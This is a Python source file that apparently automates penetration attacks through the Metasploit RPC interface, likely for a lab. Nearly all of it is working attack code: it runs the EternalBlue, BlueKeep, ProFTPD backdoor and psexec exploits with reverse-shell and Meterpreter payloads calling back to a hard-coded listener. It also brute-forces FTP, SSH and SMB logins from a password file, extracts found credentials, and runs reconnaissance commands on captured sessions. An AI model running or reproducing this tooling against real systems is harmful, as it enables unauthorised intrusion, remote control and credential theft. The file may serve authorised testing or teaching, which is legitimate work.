from pymetasploit3.msfrpc import MsfRpcClient
import logging, sys, random

# TODO MAKE IT NOT HARD CODED
LHOSTIP = '192.168.1.226'

class MetasploitInterface:
    portBindings = [55553]

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
        self.verbosity = logLevel
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        # self.verbosity = verbosity
        print(f"MSFRPCD API Connected @ {self.metasploit_ip}:{self.metasploit_port}")
        print(f"MSFRPCD OBJ: {self.client}")

    def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
        success, user_level, results = False, '', ''
        # switch statement to select exploit
        if(exploit == 'auxiliary/scanner/ftp/anonymous'):
            success, user_level, results = self.scanFTPAnon(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/ftp/ftp_login'):
            success, user_level, results = self.scanFTPLogin(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/ftp/ftp_version'):
            success, user_level, results = self.scanFTPversion(target, exploit, port)

        elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
            success, user_level, results = self.exploitFTP(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/smb/smb_ms17_010'):
            success, user_level, results = self.scanEternalBlue(target, exploit, port)

        elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
            success, user_level, results = self.exploitEternalBlue(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
            success, user_level, results = self.rdpScanner(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
            success, user_level, results = self.scanBlueKeep(target, exploit, port)
        
        elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
            success, user_level, results = self.exploitBlueKeep(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
            success, user_level, results = self.scanSSHlogin(target, exploit, port)
        
        elif(exploit == 'auxiliary/scanner/ssh/ssh_version'):
            success, user_level, results = self.scanSSHversion(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/smb/smb_version'):
            success, user_level, results = self.scanSMBversion(target, exploit, port)

        elif(exploit == 'auxiliary/scanner/smb/smb_login'):
            success, user_level, results = self.scanSMBlogin(target, exploit, port)

        elif(exploit == 'exploit/windows/smb/psexec'):
            success, user_level, results = self.exploitSMBpsexec(target,exploit,port)

        else:
            print(f"{exploit}: Not implemented")
            return 0, "", ""
        
        return success, user_level, exploit

    def exploitFTP(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES FOR RETURN AND OBTAINS MODULE INFORMATION"""
        success, user_level, address_properties = False, '', ''
        module, specific_module = self.getModuleInfo(exploit)
        
        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
     
        """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
        payload = self.client.modules.use('payload', 'cmd/unix/reverse')
        localPort = self.generateLPORT()
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = localPort
        
        
        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT RESULTS"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            if self.verbosity == "INFO":
                print(results)
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError as e:
            if self.verbosity == "DEBUG":
                print("Exception occured: Session Index Error")
            
            sid_before = 0
            results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
                if self.verbosity == "INFO":
                    print(results)
            except IndexError:
                if self.verbosity == "DEBUG":
                    print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        """ THIS CHECKS SESSION ID VALUES TO SEE IF THERE WAS A NEW SESSION, IF SO IT CONTINUES TO THEN EXECUTE COMMANDS"""
        if(sid_before == sid_after):
            if self.verbosity == "DEBUG":
                print("There was an issue creating a session or the host is not vulnerable")
            user_level = ""
            success = False

        else: 
            try:
                
                shell = self.client.sessions.session(sid_after)
                shell.write('whoami')
                
                user_level = shell.read()
                
                shell.write('ifconfig')
                address_properties = shell.read()
                
                success = True
                if self.verbosity == "INFO":
                    print(f"Success: {success}")
                    print(f"User_Level: {user_level}")
                    print(f"Address properties: \n {address_properties}")

                
            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')

                user_level = "No access"
                success = False

        
           
        self.client.consoles.console(cid).destroy
        self.portBindings.remove(localPort)
        
        return success, user_level, results
        
    
    def scanFTPAnon(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)
        

        """ SETS UP USAGE OF METASPLOIT MODULE AND TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
       
        """ CREATION OF CONSOLE, EXPLOIT RUN AND RESULTS RETURNED"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        
        if self.verbosity == "INFO":
            print(results)
        
        """ PARSING RESULTS TO SET APPROPRIATE VALUES FOR RETURN"""
        if "Anonymous READ" in results:
            success = True
            user_level = "USER_ACCESS"
            if self.verbosity == "INFO":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')
        else:
            success = False
            user_level = ""
            if self.verbosity == "DEBUG":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')

        self.client.consoles.console(cid).destroy

        return success, user_level, results


    def exploitEternalBlue(self, target, exploit, port):
        """ SETS UP VARIABLES AND MODULE INFORMATION"""
        success, user_level, properties = False, '', ''
        module, specific_module = self.getModuleInfo(exploit)


        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ GENERATES LOCAL PORT TO USE"""
        localPort = self.generateLPORT()

        """ GENERATES PAYLOAD INFORMATION """
        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = localPort
        
        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            if self.verbosity == "INFO":
                print(results)
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError: 
            """ THIS INDEX ERROR CATCHES NO SESSIONS ON START UP"""
            sid_before = 0
            results = self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
                if self.verbosity == "INFO":
                    print(results)
            except IndexError:
                """ THIS CATCHES THE NO SESSIONS ON START UP AND NO SESSIONS CREATED AFTER EXECUTION"""
                if self.verbosity == "DEBUG":
                    print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            if self.verbosity == "DEBUG":
                print("There was an issue creating a session and/or the host is not vulnerable")
            user_level = ""
            success = False
           
        else:
            """ EXECUTION OF REMOTE COMMANDS IF SESSION WAS CREATED"""
            try:
                shell = self.client.sessions.session(sid_after)
               
                user_level = shell.run_with_output("getuid")
                
                user_level = user_level.split(":")[1].lstrip()
                
                directory = shell.run_with_output('pwd')
                
                properties = shell.run_with_output('ipconfig')
            
                if self.verbosity == "INFO":
                    print(f'User Level: {user_level}')
                    print(f'Directory Location: {directory}')
                    print(f'Address Properties:\n {properties}')
                
                success = True
            
            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(f"There was an error with Eternal Blue (see below) \n {e}")
                user_level = "No access"
                success = False
        
        self.client.consoles.console(cid).destroy

        self.portBindings.remove(localPort)
        return success, user_level, results

    def rdpScanner(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND GETS MODULE INFO """
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & RUNS EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)
        
        """ PARSING OF RESULTS"""
        if "Detected" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
        else:
            success = False
            user_level = ""

        self.client.consoles.console(cid).destroy

        return success, user_level, results

    def exploitBlueKeep(self, target, exploit, port):
        """SETS UP INTIAL VALUES AND MODULE INFO"""
        success, user_level, directory, properties = False, '', '',''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        # exploit["fDisableCam"] = 0
        # exploit["TARGET"] = '7'
        # exploit["LHOST"] = LHOSTIP

        """ CREATES EXPLOIT & RUNS EXECUTION"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            if self.verbosity == "INFO":
                print(results)
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError:
            sid_before = 0
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
                if self.verbosity == "INFO":
                    print(results)
            except IndexError:

                if self.verbosity == "DEBUG":
                    print("No sessions on start and/or host not vulnerable")
                sid_after = 0
        
        if(sid_before == sid_after):
            if self.verbosity == "DEBUG":
                print("There was an issue creating a session and or the host is not vulnerable")
            user_level = "No access"
            success = False
           
        else:
            try:
                shell = self.client.sessions.session(sid_after)
                print(sid_after)
                user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
                
                directory = shell.run_with_output('pwd')
                properties = shell.run_with_output('ipconfig')
                success = True
                if self.verbosity == "INFO":
                    print(f'User Level: {user_level}')
                    print(f'Directory Location: {directory}')
                    print(f'Address Properties: \n {properties}')

            
            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(f'There was an issue with BlueKeep (see below)\n {e}')
                user_level = "No access"
                success = False
        
        self.client.consoles.console(cid).destroy
        
        return success, user_level, results
        

    def scanFTPLogin(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
        exploit["BRUTEFORCE_SPEED"] = 2

        """ CREATES CONSOLE & RUNS EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        print(type(results))
        if self.verbosity == "INFO":
            print(results)
            

        """ PARSES RESULTS FOR PROPER RETURN"""
        if "Login Successful" in results:
            success = True
            print("Credentials found:\n")
            for line in results.split("\n"):
                if "Login Successful" in line:
                    username = line.split(':')[3].lstrip()
                    password = line.split(":")[4]
                    print(f"Username: {username} Password: {password}")
                    if username == "root":
                        user_level = "root"
                    elif username == "admin":
                        user_level = 'admin'

                    else:
                        user_level = "USER_ACCESS"            
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
    
        self.client.consoles.console(cid).destroy

        return success, user_level, results

    def scanBlueKeep(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """PARSES RESULTS FOR PROPER RETURN"""
        if "target is vulnerable" in results:
            success = True
            user_level = ""
    
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"user_level")

        return success, user_level, results


    def scanEternalBlue(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ CREATES MODULE & EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """ PARSES RESULTS FOR PROPER RETURN"""
        if "VULNERABLE" in results:
            success = True
            user_level = ""

        return success, user_level, results

    def scanSMBlogin(self, target, exploit, port):
        """ SETS UP THE VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ CREATS MODULE AND SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)        
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = "/home/kali/bruteforce.txt"
        exploit["BRUTEFORCE_SPEED"] = 4


        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """PARSES RESULTS FOR PROPER RETURN"""
        if "Success" in results:
            if self.verbosity == "INFO":
                print("Credentials Found:")

            for line in results.split("\n"):
                if "Success" in line:
                    username = line.split("'")[1].strip()
                    username = username.split('\\')[1]
                    print(username)
            success = True
            user_level = "USER_ACCESS"
        
        return success, user_level, results

    def scanSMBversion(self, target, exploit, port):
        """ SETS UP THE INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ CREATES MODULE & SETS UP EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
       
        """CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "SMB Detected" in results:
            success = True
            user_level = ""
        
        return success, user_level, results

    def scanSSHlogin(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """CREATES MODULE & SETUP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
        exploit["BRUTEFORCE_SPEED"] = 4
        exploit["VERBOSE"] = True

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        # results = self.client.consoles.console(cid).run_module_with_output(exploit)
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            if self.verbosity == "INFO":
                print(results)
            sid_after = list(self.client.sessions.list.keys())[-1]

        except IndexError as e:
            if self.verbosity == "DEBUG":
                print("Exception occured: Session Index Error")
            
            sid_before = 0
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
                if self.verbosity == "INFO":
                    print(results)
            except IndexError:
                if self.verbosity == "DEBUG":
                    print("No sessions on start and host not vulnerable")
                sid_after = 0
        
        """ THIS CHECKS SESSION ID VALUES TO SEE IF THERE WAS A NEW SESSION, IF SO IT CONTINUES TO THEN EXECUTE COMMANDS"""
        if(sid_before == sid_after):
            if self.verbosity == "DEBUG":
                print("There was an issue creating a session or the host is not vulnerable")
            user_level = ""
            success = False

        else: 
            try:
                
                shell = self.client.sessions.session(sid_after)
                shell.write('whoami')
                
                user_level = shell.read()
                user_level = "USER_ACCESS"
                
                shell.write('ifconfig')
                address_properties = shell.read()
                
                success = True
                if self.verbosity == "INFO":
                    print(f"Success: {success}")
                    print(f"User_Level: {user_level}")
                    print(f"Address properties: \n {address_properties}")

                
            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')

                user_level = "No access"
                success = False

        
           
        self.client.consoles.console(cid).destroy
        # self.portBindings.remove(localPort)
        
        return success, user_level, results
        
        # if self.verbosity == "INFO":
        #     print(results)

        # """ NEED TO GET CORRECT RESULTS SETUP - NEED BOX TO BE SETUP FOR PROPER RETURNING"""
        # if "VULNERABLE" in results:
        #     success = True
        #     user_level = ""
      
        # return success, user_level, results

    def scanSSHversion(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """CREATES MODULE & SETS UP EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port


        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "SSH server version" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f'User_Level: {user_level}')
  
        return success, user_level, results

    def scanFTPversion(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP MODULE AND EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE AND EXECUTES MODULE"""
        cid = self.client.consoles.console().cid
        results = self.client.consoles.console(cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "FTP Banner" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')
            
            

        return success, user_level, results

    def exploitSMBpsexec(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP MODULE AND EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["SMBPass"] = "Passw0rd!"
        exploit["SMBUser"] = 'IEUser'
        exploit["ConnectTimeout"] = 100

        payload = self.client.modules.use('payload', 'windows/meterpreter/reverse_tcp')

        payload['LHOST'] = LHOSTIP
        # payload['LPORT'] = self.generateLPORT()

        """ CREATES CONSOLE & EXECUTES EXPLOIT ERROR HANDLING"""
        cid = self.client.consoles.console().cid
        try:
            sid_before = list(self.client.sessions.list.keys())[-1]
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            sid_after = list(self.client.sessions.list.keys())[-1]
            if self.verbosity == "INFO":
                print(results)

        except IndexError as e:
            sid_before = 0
            results = self.client.consoles.console(cid).run_module_with_output(exploit)
            if self.verbosity == "DEBUG":
                print(results)
            try:
                sid_after = list(self.client.sessions.list.keys())[-1]
                if self.verbosity == "INFO":
                    print(results)
            except IndexError as e:
                sid_after = 0
        
        if(sid_before == sid_after):
            if self.verbosity == "DEBUG":
                print("There was an issue creating a session or the host is not vulnerable" )
            user_level = "No access"
            success = False
           
        else:
            try:
                shell = self.client.sessions.session(sid_after)
                
                user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
                directory = shell.run_with_output('pwd')
                properties = shell.run_with_output('ipconfig')

                success = True
                if self.verbosity == "INFO":
                    print(f'User Level: {user_level}')
                    print(f'Directory Location: {directory}')
                    print(f'Address Properties:\n {properties}')
            
            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(str(e))
                user_level = "No access"
                success = False
        
        self.client.consoles.console(cid).destroy

        return success, user_level, results

    """GENERATES DIFFERENT LOCAL PORTS FOR USEAGE BY EXPLOITS """
    def generateLPORT(self):
        localPort = random.randint(49152,65535)

        while localPort in self.portBindings:
            localPort = random.ranint(49152,65535)
            
        self.portBindings.append(localPort)

        return localPort

    """ SEPARATES AND OBTAINS MODULE INFORMATION FOR SETUP"""
    def getModuleInfo(self, exploit):
        split_string = exploit.split('/')
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        return module, specific_module
        
# functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]

# Outputs:
